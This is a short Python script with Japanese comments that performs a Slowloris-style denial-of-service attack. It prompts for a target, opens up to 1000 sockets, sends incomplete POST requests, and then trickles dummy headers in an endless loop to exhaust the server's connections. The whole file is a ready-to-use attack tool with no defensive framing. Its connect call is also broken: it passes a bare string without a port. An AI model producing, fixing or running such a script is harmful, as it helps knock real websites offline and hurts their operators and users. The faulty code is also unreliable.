import socket
import time
TARGET_HOST = input("ターゲットURL:")

CONNECTIONS = 1000
SLEEP_TIME = 0.05

sockets = []

# ① 接続をたくさん作る
for i in range(CONNECTIONS):
    try:
        s = socket.socket()
        s.settimeout(10)
        s.connect((TARGET_HOST))

        # リクエスト開始（終わらせない）
        s.send(b"POST / HTTP/1.1\r\n")
        s.send(b"Host: test\r\n")
        sockets.append(s)
        print("Connected", i)
    except:
        print("Connect failed")

# ② 遅延して少しずつ送る
while True:
    for s in list(sockets):
        try:
            s.send(b"X-Dummy: a\r\n")
        except:
            sockets.remove(s)

    print("Alive:", len(sockets))
    time.sleep(SLEEP_TIME)
